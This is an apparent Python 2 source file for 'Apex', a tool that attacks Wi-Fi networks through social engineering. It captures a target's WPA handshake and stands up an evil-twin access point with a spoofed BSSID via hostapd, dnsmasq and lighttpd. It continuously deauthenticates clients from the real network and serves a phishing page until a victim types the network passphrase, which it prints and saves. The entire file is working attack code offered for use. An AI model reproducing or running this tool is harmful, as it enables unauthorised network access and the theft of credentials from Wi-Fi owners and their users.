#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Version: 1.1
# Date: 01/08/2018
# Author: Ethical-H4CK3R

from sys import exit
from time import sleep
from random import randint
from threading import Thread
from lib.webpage import Webpage
from subprocess import Popen, call
from lib.interface import Interface
from argparse import ArgumentParser
from lib.deauth import Deauthenticate
from commands import getoutput as shell
from lib.eviltwin import MonitorEviltwin
from lib.accesspoints import Accesspoints
from lib.aircrack import Discover, Monitor

import os
import shutil
import lib.settings as settings

class Apex(object):
 ''' Using Social Engineering To Hack Wifi '''

 def __init__(self, iface, ap, handshake):

  self.ap_essid = ap['essid']
  self.ap_chann = ap['chann']
  self.ap_bssid = self.mac_address(ap['bssid'])

  self.evil_twin = MonitorEviltwin()
  self.phishing = Webpage(handshake)
  self.devnull = open(os.devnull, 'w')
  self.errors = open(settings.ERROR_LOG, 'a')
  self.deauth = Deauthenticate(settings.DEAUTH_INTERFACE, ap['bssid'])
  Interface().create_iface(iface, settings.EVIL_TWIN_INTERFACE, self.ap_bssid)

 def mac_address(self, bssid):
  bssid = bssid.lower()
  current_item = bssid[9]

  items = '0123456789abcdef'
  get_item = lambda: items[randint(0, len(items)-1)].lower()
  new_item = get_item()

  # looking like the target without becoming the target
  while new_item == current_item:
   new_item = get_item()

  _bssid = list(bssid.upper())
  _bssid[9] = new_item.upper()

  return ''.join(_bssid)

 def disconnect(self):
  while all([not self.phishing.passphrase, self.phishing.is_alive]):
   map(self.deauth.send_pkts, range(256))

 def create_configs(self):

  # Hostapd
  with open(settings.HOSTAPD_CONFIG_PATH, 'w') as hostapd_config:
   hostapd_config.write(settings.HOSTAPD_CONFIG.format(self.ap_essid, self.ap_chann, settings.EVIL_TWIN_INTERFACE))

  # Lighttpd
  with open(settings.LIGHTTPD_CONFIG_PATH, 'w') as lighttpd_config:
   lighttpd_config.write(settings.LIGHTTPD_CONFIG)

  # Dnsmasq
  with open(settings.DNS_CONFIG_PATH, 'w') as dnsmasq_config:
   if os.path.exists(settings.DNS_LEASES_PATH):os.remove(settings.DNS_LEASES_PATH)
   dnsmasq_config.write(settings.DNS_CONFIG.format(settings.EVIL_TWIN_INTERFACE, settings.GATEWAY, settings.DHCP_RANGE))

 def start_ap(self):
  output = open(settings.EVIL_TWIN_OUTPUT, 'w')
  Popen('hostapd {}'.format(settings.HOSTAPD_CONFIG_PATH), stderr=self.errors, stdout=output, shell=True)
  sleep(1.5)

 def start_dns(self):
  Popen('dnsmasq -C {}'.format(settings.DNS_CONFIG_PATH), stderr=self.errors, stdout=self.devnull, shell=True)
  sleep(1.5)

 def start_lighttpd(self):
  Popen('lighttpd -f {}'.format(settings.LIGHTTPD_CONFIG_PATH), stderr=self.errors, stdout=self.devnull, shell=True)
  sleep(1.5)

 def config_net(self):
  Popen('ifconfig {0} mtu 1400 && ifconfig {0} up {1} netmask {2}'.format(
  settings.EVIL_TWIN_INTERFACE, settings.GATEWAY, settings.NET_MSK),stderr=self.errors, shell=True)
  sleep(1.5)

 def start(self):
  call(['clear'])
  print '[-] Creating Evil Twin Accesspoint ...'

  # evil twin AP
  self.config_net()
  self.create_configs()

  self.start_ap()
  self.start_dns()
  self.start_lighttpd()

  # deauthentication thread
  Thread(target=self.disconnect).start()

  # monitor phishing site
  Thread(target=self.phishing.monitor).start()

 def display_evil_twin(self):
  call(['clear'])
  clients = self.evil_twin.evil_twin_info()
  colored = lambda item: '{}{}{}'.format(settings.COLORS['red'], item, settings.COLORS['white'])

  num = colored('000')
  dash = colored(' -')
  bssid = colored(self.ap_bssid)
  essid = colored(self.ap_essid)
  chann = colored(self.ap_chann if len(str(self.ap_chann)) != 1 else '0{}'.format(self.ap_chann))

  if clients:
   for n in clients:print n
   sleep(1)

  else:
   print '              +-------------------------+'
   print '              || Evil Twin Accesspoint ||'
   print '-'*60
   print '|| {}NUM{} ||     \tBssid\t    || Channel || Client || Essid ||'.\
   format(settings.COLORS['yellow'], settings.COLORS['white'])

   print '-'*60
   print '+{}+'.format('-'*58)
   print '|| {} || {} ||   {}    ||   {}   || {} '.\
   format(num, bssid, chann, dash, essid)
   print '+{}+'.format('-'*58)
   sleep(1)

def kill_processes():
 for proc in settings.ENTER_EXIT_PROC['proc']:
  cmd = 'pkill {}'.format(proc)
  Popen(cmd, shell=True).wait()

def stop_services():
 for service in settings.ENTER_EXIT_PROC['services']:
  cmd = 'service {} stop'.format(service)
  Popen(cmd, shell=True).wait()

def start_services():
 for service in settings.ENTER_EXIT_PROC['services']:
  cmd = 'service {} start'.format(service)
  Popen(cmd, shell=True).wait()

def config_work_dir():
 if not os.path.exists(settings.WORKING_PATH):
  os.mkdir(settings.WORKING_PATH)
 else:
  for item in os.listdir(settings.WORKING_PATH):
   if any([item.endswith('.cap'), item.endswith('.csv')]):
    os.remove(settings.WORKING_PATH + '/' + item)

def test_injection(iface):
 call(['clear'])
 shell('ifconfig {0} down && ifconfig {0} up'.format(iface))
 print '[-] Testing Packet Injection on {} ...'.format(iface)

 if not 'Injection is working' in shell('aireplay-ng -9 {}'.format(iface)):

  call(['clear'])
  exit('[!] Packet Injection is not working on {}!'.format(iface))

def find_interface(iface):
 if not iface in shell('iwconfig'):
  call(['clear'])
  exit('[!] Unable to find {}'.format(iface))

def move_web_src():
 for _ in os.listdir(settings.SITE):
  current_path = '{}/{}'.format(settings.SITE, _)
  new_path = '{}/{}'.format(settings.HOSTING_PATH, _)
  if os.path.isdir(current_path):shutil.copytree(current_path, new_path)
  else:shutil.copy2(current_path, new_path)

def remove_iface():
 interface = Interface()
 interface.remove_iface(settings.SCAN_INTERFACE)
 interface.remove_iface(settings.DEAUTH_INTERFACE)
 interface.remove_iface(settings.EVIL_TWIN_INTERFACE)

def remove_files():
 for item in os.listdir(settings.WORKING_PATH):
  if os.path.isfile(settings.WORKING_PATH + '/' + item):
   if settings.ERROR_LOG != settings.WORKING_PATH + '/' + item:
    os.remove(settings.WORKING_PATH + '/' + item)

def enter_cmds():
 stop_services()
 kill_processes()
 try:shutil.rmtree(settings.HOSTING_PATH)
 except:pass

def exit_cmds():
 print '[-] Exiting ...'
 kill_processes()
 start_services()

 remove_iface()
 remove_files()
 try:shutil.rmtree(settings.HOSTING_PATH)
 except:pass
 exit()

def main():
 args = ArgumentParser()
 args.add_argument('interface', help='wireless interface')
 iface = args.parse_args().interface

 enter_cmds()
 find_interface(iface)

 # injection test
 remove_iface()
 test_injection(iface)

 # start
 call(['clear'])
 config_work_dir()
 print '[-] Scanning ...'

 try:
  target_ap = Discover(iface).run()
  if not target_ap:exit_cmds()

  get_handshake = Monitor(iface, target_ap)
  get_handshake.scan()

  if not get_handshake.handshake:
   exit_cmds()

  # create phishing page directory
  phishing = Webpage(get_handshake._handshake_file)
  os.mkdir(settings.HOSTING_PATH)
  move_web_src()

  # create phishing object
  apex = Apex(iface, target_ap, get_handshake._handshake_file)
  apex.start()

  while not apex.phishing.passphrase:
   try:
    apex.display_evil_twin()
    sleep(0.5)
   except KeyboardInterrupt:break

  apex.display_evil_twin()
  result = '{}{}{}'.format(settings.COLORS['red'] if not apex.phishing.passphrase else settings.COLORS['green'],
  'NOT FOUND' if not apex.phishing.passphrase else apex.phishing.passphrase, settings.COLORS['white'])
  print '\n[-] Pre-Shared Key: {}'.format(result)
  apex.phishing.is_alive = False

  if apex.phishing.passphrase:
   with open(get_handshake.handshake_path + '/info.txt', 'w') as info:
    info.write('[-] ESSID: {}\n[-] BSSID: {}\n[+] Pre-SharedKey: {}'.\
    format(target_ap['essid'], target_ap['bssid'], apex.phishing.passphrase))
  exit_cmds()

 except KeyboardInterrupt:
  exit_cmds()

if __name__ == '__main__':
 main()
